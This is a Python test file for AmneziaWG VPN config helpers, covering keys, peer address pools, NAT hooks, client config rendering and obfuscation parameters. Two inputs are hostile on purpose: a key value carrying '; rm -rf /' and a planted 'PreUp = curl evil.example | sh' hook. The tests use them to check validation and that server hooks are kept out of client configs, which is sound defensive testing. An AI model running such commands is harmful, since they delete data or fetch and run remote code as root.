"""Чистые функции работы с конфигами AmneziaWG: без SSH, БД и сети."""

import ipaddress
from datetime import datetime, timezone

import pytest

from core.exceptions import AddressPoolExhaustedError
from infrastructure.vpn.awg_config import (
    append_peer,
    ensure_nat_hooks,
    generate_secret_keys,
    interface_values,
    is_valid_public_key,
    list_peers,
    parse_client_config,
    parse_latest_handshakes,
    pick_free_address,
    public_key_from_private,
    random_obfuscation,
    remove_peer,
    render_awg_config,
    render_client_config,
    render_peer_block,
    used_peer_addresses,
)
from infrastructure.vpn.config import NAT_POST_DOWN, NAT_POST_UP

IP = ipaddress.IPv4Address


@pytest.fixture
def server_config() -> str:
    return render_awg_config(generate_secret_keys().private_key, 31000)


def with_peers(config: str, *addresses: str) -> str:
    for index, address in enumerate(addresses):
        keys = generate_secret_keys()
        config = append_peer(config, render_peer_block(f"grant-{index}", keys.public_key, keys.psk, IP(address)))
    return config


def test_keys_are_valid_and_public_key_derives_from_private() -> None:
    keys = generate_secret_keys()
    assert is_valid_public_key(keys.public_key)
    assert public_key_from_private(keys.private_key) == keys.public_key
    assert keys.private_key != keys.public_key


@pytest.mark.parametrize("value", ["", "short=", "a" * 44, "a" * 43 + "=\n", "a" * 42 + "$=", "a" * 43 + "=; rm -rf /"])
def test_invalid_public_keys_rejected(value: str) -> None:
    assert not is_valid_public_key(value)


def test_server_config_has_port_key_and_nat_hooks(server_config: str) -> None:
    values = interface_values(server_config)
    assert values["ListenPort"] == "31000"
    assert values["PostUp"] == NAT_POST_UP
    assert values["PostDown"] == NAT_POST_DOWN
    assert values["Jc"]  # параметры обфускации на месте


def test_first_free_address_skips_server_and_taken(server_config: str) -> None:
    server_ip = ipaddress.ip_interface(interface_values(server_config)["Address"]).ip
    first = pick_free_address(server_config)
    assert first != server_ip
    config = with_peers(server_config, str(first))
    second = pick_free_address(config)
    assert second not in {first, server_ip}
    assert used_peer_addresses(config) == {first}


def test_freed_address_is_reused(server_config: str) -> None:
    config = with_peers(server_config, "10.8.1.1", "10.8.1.2")
    first_peer_key = list_peers(config)[0].public_key
    config, removed = remove_peer(config, first_peer_key)
    assert removed
    assert pick_free_address(config) == IP("10.8.1.1")


def test_pool_exhausted() -> None:
    # /30: хосты .1 и .2; сервер занимает .1, единственный клиент — .2.
    config = render_awg_config(generate_secret_keys().private_key, 31000).replace(
        "Address = 10.8.1.0/24", "Address = 10.9.0.1/30"
    )
    config = with_peers(config, "10.9.0.2")
    with pytest.raises(AddressPoolExhaustedError):
        pick_free_address(config)


def test_remove_peer_is_idempotent_and_keeps_others(server_config: str) -> None:
    config = with_peers(server_config, "10.8.1.1", "10.8.1.2")
    first, second = list_peers(config)
    config, removed = remove_peer(config, first.public_key)
    assert removed
    config, removed_again = remove_peer(config, first.public_key)
    assert not removed_again
    assert [peer.public_key for peer in list_peers(config)] == [second.public_key]
    assert interface_values(config)["ListenPort"] == "31000"  # [Interface] не пострадал


def test_list_peers_reads_name_key_address(server_config: str) -> None:
    keys = generate_secret_keys()
    config = append_peer(server_config, render_peer_block("grant-abc", keys.public_key, keys.psk, IP("10.8.1.7")))
    (peer,) = list_peers(config)
    assert (peer.name, peer.public_key, peer.address) == ("grant-abc", keys.public_key, "10.8.1.7")


def test_peer_without_name_comment_is_listed_as_foreign() -> None:
    keys = generate_secret_keys()
    config = render_awg_config(generate_secret_keys().private_key, 31000) + (
        f"\n[Peer]\nPublicKey = {keys.public_key}\nAllowedIPs = 10.8.1.9/32\n"
    )
    (peer,) = list_peers(config)
    assert peer.name is None


def test_ensure_nat_hooks_adds_once_and_keeps_foreign_postup() -> None:
    old = (
        "[Interface]\nPrivateKey = x\nAddress = 10.8.1.0/24\nListenPort = 1\nPostUp = echo hi\n"
        "\n[Peer]\nPublicKey = k\n"
    )
    patched, changed = ensure_nat_hooks(old)
    assert changed
    assert "PostUp = echo hi" in patched
    assert f"PostUp = {NAT_POST_UP}" in patched
    assert patched.index("PostUp") < patched.index("[Peer]")  # хуки внутри [Interface]
    again, changed_again = ensure_nat_hooks(patched)
    assert not changed_again and again == patched


def test_client_config_copies_obfuscation_but_not_server_secrets(server_config: str) -> None:
    client = generate_secret_keys()
    server_public = generate_secret_keys().public_key
    text = render_client_config(
        server_config=server_config,
        client_private_key=client.private_key,
        client_address=IP("10.8.1.5"),
        psk=client.psk,
        server_public_key=server_public,
        endpoint_host="203.0.113.10",
    )
    server_values = interface_values(server_config)
    client_values = interface_values(text)
    assert client_values["Jc"] == server_values["Jc"] and client_values["H1"] == server_values["H1"]
    assert client_values["PrivateKey"] == client.private_key != server_values["PrivateKey"]
    for server_only in ("ListenPort", "PostUp", "PostDown"):
        assert server_only not in client_values
    assert "Endpoint = 203.0.113.10:31000" in text
    assert f"PublicKey = {server_public}" in text


def test_client_config_wraps_ipv6_endpoint(server_config: str) -> None:
    keys = generate_secret_keys()
    text = render_client_config(
        server_config=server_config,
        client_private_key=keys.private_key,
        client_address=IP("10.8.1.5"),
        psk=keys.psk,
        server_public_key=keys.public_key,
        endpoint_host="2001:db8::1",
    )
    assert "Endpoint = [2001:db8::1]:31000" in text


def test_parse_client_config_roundtrip(server_config: str) -> None:
    keys = generate_secret_keys()
    text = render_client_config(
        server_config=server_config,
        client_private_key=keys.private_key,
        client_address=IP("10.8.1.5"),
        psk=keys.psk,
        server_public_key=generate_secret_keys().public_key,
        endpoint_host="203.0.113.10",
    )
    params = parse_client_config(text)
    assert (params.public_key, params.psk, params.address) == (keys.public_key, keys.psk, IP("10.8.1.5"))


def test_malformed_client_config_error_does_not_leak_content() -> None:
    secret = "PrivateKey = not-a-real-key-but-pretend-it-is-secret"
    with pytest.raises(ValueError) as error:
        parse_client_config(f"[Interface]\n{secret}\nAddress = 10.8.1.5/32\n")
    assert "secret" not in str(error.value) and error.value.__cause__ is None


def test_parse_latest_handshakes() -> None:
    output = "keyA=\t1700000000\nkeyB=\t0\ngarbage line\nkeyC=\tnot-a-number\n"
    handshakes = parse_latest_handshakes(output)
    assert handshakes["keyA="] == datetime.fromtimestamp(1700000000, tz=timezone.utc)
    assert handshakes["keyB="] is None  # 0 — рукопожатий не было
    assert "keyC=" not in handshakes


def test_random_obfuscation_respects_amneziawg_constraints() -> None:
    for _ in range(1000):
        o = random_obfuscation()
        assert 148 + o.s1 != 92 + o.s2  # init и response не совпадают по размеру
        headers = {o.h1, o.h2, o.h3, o.h4}
        assert len(headers) == 4 and not headers & {1, 2, 3, 4}  # не заголовки обычного WireGuard
        assert 0 < o.jmin < o.jmax <= 1280 and o.jc >= 1


def test_each_install_gets_own_obfuscation_and_client_copies_it() -> None:
    first = interface_values(render_awg_config(generate_secret_keys().private_key, 31000))
    second = interface_values(render_awg_config(generate_secret_keys().private_key, 31000))
    assert [first[k] for k in ("H1", "H2", "H3", "H4")] != [second[k] for k in ("H1", "H2", "H3", "H4")]
    client = interface_values(_client_for(render_awg_config(generate_secret_keys().private_key, 31000)))
    assert {k for k in client if k.startswith(("H", "S", "J"))} == {
        "H1",
        "H2",
        "H3",
        "H4",
        "S1",
        "S2",
        "S3",
        "S4",
        "Jc",
        "Jmin",
        "Jmax",
    }


def test_client_config_gets_only_allowlisted_server_keys(server_config: str) -> None:
    """Хуки и прочие ключи серверного [Interface] к клиенту не попадают: wg-quick выполнил бы их у клиента от root."""
    tampered = server_config.replace(
        "[Interface]\n", "[Interface]\nPreUp = curl evil.example | sh\nTable = off\nSaveConfig = true\nMTU = 1280\n", 1
    )
    client = _client_for(tampered)
    for key in ("PreUp", "Table", "SaveConfig", "MTU", "PostUp", "PostDown", "ListenPort"):
        assert f"{key} =" not in client
    assert "Jc =" in client and "H1 =" in client  # обфускация — на месте


def _client_for(server_text: str) -> str:
    keys = generate_secret_keys()
    return render_client_config(
        server_config=server_text,
        client_private_key=keys.private_key,
        client_address=ipaddress.IPv4Address("10.8.1.2"),
        psk=keys.psk,
        server_public_key=keys.public_key,
        endpoint_host="203.0.113.10",
    )
